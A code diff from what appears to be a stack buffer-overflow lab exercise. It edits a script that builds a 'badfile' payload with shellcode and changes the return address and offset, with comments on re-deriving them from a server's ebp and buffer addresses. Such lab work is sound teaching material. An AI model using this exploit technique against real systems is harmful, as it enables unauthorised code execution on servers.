@@ -33,8 +33,10 @@ def createBadfile():
    # Put the shellcode at the end
    content[500-len(shellcode):] = shellcode
 
-   ret    = 0xffc9d728
-   offset = 0xffc9d6b8
+   # Derived from the server's printed ebp/buffer (see §4.1).
+   # If the attack fails on your machine, re-derive: offset = ebp - buffer + 4, ret = ebp + ~100
+   ret    = 0xffffd65c
+   offset = 116
 
    content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
    ##################################################################
